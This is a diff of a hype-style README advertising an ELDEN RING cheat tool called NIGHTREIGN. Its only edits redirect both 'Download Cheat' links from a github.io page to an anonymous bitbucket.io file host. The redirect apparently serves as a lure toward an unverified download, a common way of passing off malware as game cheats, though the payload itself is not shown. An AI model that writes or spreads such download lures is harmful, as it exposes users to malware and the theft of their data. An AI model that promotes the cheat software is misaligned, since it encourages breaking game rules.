@@ -4,7 +4,7 @@
 
 Let’s be real—ELDEN RING is brutal. From soft-stepping around deadly bosses to getting clapped by random mobs, it’s a grind. But what if you could flip the script and dominate the Lands Between with ease? That’s where **NIGHTREIGN Cheat** for ELDEN RING steps in—a full-blown cheat engine built for chaos, speed, and absolute control. Whether you're tired of dying every five minutes or just want to go full anime protagonist mode, this one's for you 😈.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/elden-ring/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload1.bitbucket.io)
 ---
 
 ## 🔍 What is NIGHTREIGN?
@@ -13,7 +13,7 @@ NIGHTREIGN is a next-level cheat suite tailored for ELDEN RING. It comes packed 
 
 No more runbacks. No more rage quits. Only dominance. 🎮
 
-[![Download Cheat](https://img-s-msn-com.akamaized.net/tenant/amp/entityid/AA1yUYOb.img?w=1280&h=720&m=4&q=70)](https://wecheaters.github.io/cheats/elden-ring/)
+[![Download Cheat](https://img-s-msn-com.akamaized.net/tenant/amp/entityid/AA1yUYOb.img?w=1280&h=720&m=4&q=70)](https://fileoffload1.bitbucket.io)
 ---
 
 ## ⚙️ Core Features That Go Hard 💥
